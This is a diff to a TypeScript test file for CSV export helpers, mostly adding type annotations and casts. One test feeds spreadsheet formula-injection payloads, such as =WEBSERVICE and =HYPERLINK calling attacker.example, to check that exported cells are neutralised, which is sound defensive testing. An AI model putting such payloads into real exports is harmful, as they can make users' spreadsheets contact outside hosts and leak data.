@@ -18,7 +18,7 @@ function req(headers = {}, method = "GET") {
   });
 }
 
-async function drainCsvStream(stream) {
+async function drainCsvStream(stream: ReadableStream) {
   const reader = stream.getReader();
   const decoder = new TextDecoder();
   let text = "";
@@ -32,7 +32,7 @@ async function drainCsvStream(stream) {
 }
 
 test("rowsToCsv returns an empty body for empty rows without explicit columns", () => {
-  assert.equal(rowsToCsv([]), "");
+  assert.equal(rowsToCsv([], undefined), "");
 });
 
 test("rowsToCsv emits explicit columns for empty rows", () => {
@@ -40,21 +40,24 @@ test("rowsToCsv emits explicit columns for empty rows", () => {
 });
 
 test("rowsToCsv accepts explicit columns with a non-array row input", () => {
-  assert.equal(rowsToCsv(null, ["netuid"]), "netuid");
+  assert.equal(rowsToCsv(null as unknown as unknown[], ["netuid"]), "netuid");
 });
 
 test("rowsToCsv skips malformed rows when deriving columns", () => {
   assert.equal(
-    rowsToCsv([null, ["bad"], { netuid: 7 }]),
+    rowsToCsv([null, ["bad"], { netuid: 7 }], undefined),
     "netuid\r\n\r\n\r\n7",
   );
 });
 
 test("rowsToCsv uses first-seen union column order and escapes RFC 4180 cells", () => {
-  const csv = rowsToCsv([
-    { a: "plain", b: "comma,value", c: 'quote "value"' },
-    { b: "line\nfeed", d: "carriage\rreturn" },
-  ]);
+  const csv = rowsToCsv(
+    [
+      { a: "plain", b: "comma,value", c: 'quote "value"' },
+      { b: "line\nfeed", d: "carriage\rreturn" },
+    ],
+    undefined,
+  );
 
   assert.equal(
     csv,
@@ -63,14 +66,17 @@ test("rowsToCsv uses first-seen union column order and escapes RFC 4180 cells", 
 });
 
 test("rowsToCsv serializes nulls, arrays, and objects predictably", () => {
-  const csv = rowsToCsv([
-    {
-      missing: null,
-      tags: ["inference", "validators", { nested: true }],
-      metadata: { ok: true, count: 2 },
-      empty: undefined,
-    },
-  ]);
+  const csv = rowsToCsv(
+    [
+      {
+        missing: null,
+        tags: ["inference", "validators", { nested: true }],
+        metadata: { ok: true, count: 2 },
+        empty: undefined,
+      },
+    ],
+    undefined,
+  );
 
   assert.equal(
     csv,
@@ -79,16 +85,19 @@ test("rowsToCsv serializes nulls, arrays, and objects predictably", () => {
 });
 
 test("rowsToCsv neutralizes spreadsheet formula-leading cells", () => {
-  const csv = rowsToCsv([
-    {
-      eq: '=WEBSERVICE("https://attacker.example")',
-      plus: '+HYPERLINK("https://attacker.example")',
-      minus: "-2+3",
-      at: "@SUM(1,1)",
-      tab: "\t=1+1",
-      tags: ["=evil", "safe"],
-    },
-  ]);
+  const csv = rowsToCsv(
+    [
+      {
+        eq: '=WEBSERVICE("https://attacker.example")',
+        plus: '+HYPERLINK("https://attacker.example")',
+        minus: "-2+3",
+        at: "@SUM(1,1)",
+        tab: "\t=1+1",
+        tags: ["=evil", "safe"],
+      },
+    ],
+    undefined,
+  );
 
   const expected = `eq,plus,minus,at,tab,tags\r\n"'=WEBSERVICE(""https://attacker.example"")","'+HYPERLINK(""https://attacker.example"")",'-2+3,"'@SUM(1,1)",'\t=1+1,'=evil;safe`;
   assert.equal(csv, expected);
@@ -134,7 +143,7 @@ test("csvResponse emits CSV download headers and a conditional ETag", async () =
     "standard",
   );
   assert.equal(first.status, 200);
-  assert.match(first.headers.get("content-type"), /^text\/csv/);
+  assert.match(first.headers.get("content-type")!, /^text\/csv/);
   assert.equal(
     first.headers.get("content-disposition"),
     'attachment; filename="subnets.csv"',
@@ -211,7 +220,7 @@ test("csvBodyStream emits the header before row chunks", async () => {
 });
 
 test("csvBodyStream closes immediately when no header can be derived", async () => {
-  const stream = csvBodyStream([]);
+  const stream = csvBodyStream([], undefined);
   const done = await stream.getReader().read();
   assert.equal(done.done, true);
   assert.equal(done.value, undefined);
@@ -230,7 +239,7 @@ test("csvBodyStream emits a header-only export for explicit empty columns", asyn
 });
 
 test("csvBodyStream tolerates non-array rows when explicit columns are provided", async () => {
-  const stream = csvBodyStream(null, ["netuid"]);
+  const stream = csvBodyStream(null as unknown as unknown[], ["netuid"]);
   const reader = stream.getReader();
   const decoder = new TextDecoder();
 
@@ -308,10 +317,10 @@ test("csvResponse can stream endpoint-sized exports without eager ETags", async 
     { stream: true },
   );
   assert.equal(response.status, 200);
-  assert.match(response.headers.get("content-type"), /^text\/csv/);
+  assert.match(response.headers.get("content-type")!, /^text\/csv/);
   assert.equal(response.headers.get("etag"), null);
 
-  const reader = response.body.getReader();
+  const reader = response.body!.getReader();
   const decoder = new TextDecoder();
   const first = await reader.read();
   assert.equal(decoder.decode(first.value), "netuid,provider,status\r\n");
